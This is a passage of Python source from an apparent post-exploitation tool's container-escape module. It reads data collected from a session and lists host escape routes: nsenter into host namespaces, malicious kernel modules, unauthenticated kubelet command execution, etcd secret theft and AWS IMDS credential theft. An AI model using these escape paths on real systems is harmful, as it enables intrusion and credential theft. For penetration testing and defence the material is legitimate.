            escape_paths.append("Block device access → mount host disk → read/write host files")
        if re.search(r'cap_sys_module', cap_text, re.I):
            escape_paths.append("CAP_SYS_MODULE → load malicious kernel module → root on host")
        if cap_match and int(cap_match.group(1), 16) >= 0x000001ffffffffff:
            escape_paths.append("Privileged container → nsenter --target 1 --mount --uts --ipc --net --pid → host namespace")
        if collected.get('proc1_root', '').strip() and 'No such' not in collected.get('proc1_root', ''):
            escape_paths.append("/proc/1/root access → read host filesystem directly")
        if collected.get('binfmt_misc', '').strip() and 'enabled' in collected.get('binfmt_status', '').lower():
            escape_paths.append("binfmt_misc enabled → register custom binary format → host code execution")
        if 'yes' in collected.get('k8s_cluster_admin', '').lower():
            escape_paths.append("K8s cluster-admin → create privileged pod → mount host / → escape")
        if collected.get('kubelet_pods', '').strip() and 'Connection refused' not in collected.get('kubelet_pods', ''):
            escape_paths.append("Kubelet unauthenticated → /run endpoint → execute commands on node")
        if collected.get('etcd_api', '').strip() and '"etcdserver"' in collected.get('etcd_api', ''):
            escape_paths.append("etcd access → read all secrets → extract credentials → pivot")
        if collected.get('imds_aws', '').strip() and 'ami-id' in collected.get('imds_aws', ''):
            escape_paths.append("AWS IMDS → steal IAM role credentials → access AWS resources")

        if escape_paths:
            sections.append(f"\n{'═'*64}")
            sections.append("  [!] Container Escape Paths:")
            for path in escape_paths:
                sections.append(f"  ► {path}")

        self.info(f"container-escape complete — {findings_created} findings, {len(escape_paths)} escape paths.")
        return '\n'.join(sections) if sections else "No container data collected."

    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''